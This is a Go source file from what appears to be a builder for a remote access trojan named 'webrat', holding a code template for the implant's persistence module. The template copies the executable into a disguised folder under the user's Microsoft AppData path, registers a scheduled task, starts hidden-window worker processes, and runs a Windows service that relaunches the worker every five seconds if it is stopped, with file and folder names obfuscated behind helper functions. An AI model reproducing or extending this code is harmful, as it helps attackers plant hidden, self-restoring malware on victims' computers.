package buildergen

import "strings"

func templateProcess() string {
	return strings.TrimSpace(`
const stillActive uint32 = 259

type webratService struct{}

func isProcessRunning(pid int) bool {
	if pid <= 0 {
		return false
	}
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		return false
	}
	defer windows.CloseHandle(h)
	var code uint32
	if err := windows.GetExitCodeProcess(h, &code); err != nil {
		return false
	}
	return code == stillActive
}

func (s *webratService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	const accepted = svc.AcceptStop | svc.AcceptShutdown
	changes <- svc.Status{State: svc.StartPending}

	workerPath := filepath.Join(os.Getenv(getAppDataEnvName()), getMicrosoftDirName(), getWindowsDirName(), getWorkerExeName())

	servicePid := os.Getpid()
	workerPid := 0
	startWorker := func() int {
		cmd := exec.Command(workerPath, "worker", strconv.Itoa(servicePid))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err != nil {
			return 0
		}
		return cmd.Process.Pid
	}

	go func() {
		for {
			time.Sleep(5 * time.Second)
			if !isProcessRunning(workerPid) {
				workerPid = startWorker()
			}
		}
	}()

	changes <- svc.Status{State: svc.Running, Accepts: accepted}

	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				return false, 0
			}
		}
	}
}

func runPrimaryWithWorker() {
	exePath, err := os.Executable()
	if err != nil {
		loopA()
		return
	}

	disguisedDir := filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())
	disguisedPath := filepath.Join(disguisedDir, getDisguisedExeName())

	if err := os.MkdirAll(disguisedDir, 0755); err == nil {
		_ = copyFile(exePath, disguisedPath)
	} else {
		disguisedPath = exePath
	}

	opSetupTask(disguisedPath)

	exeNorm, _ := filepath.Abs(exePath)
	disguisedNorm, _ := filepath.Abs(disguisedPath)
	if !strings.EqualFold(exeNorm, disguisedNorm) {
		cmd := exec.Command(disguisedPath, "worker")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err := cmd.Start(); err == nil {
			return
		}
	}

	loopA()
}

func runWorkerGuard() {
	_ = setupLogger()
	loopA()
}
`)
}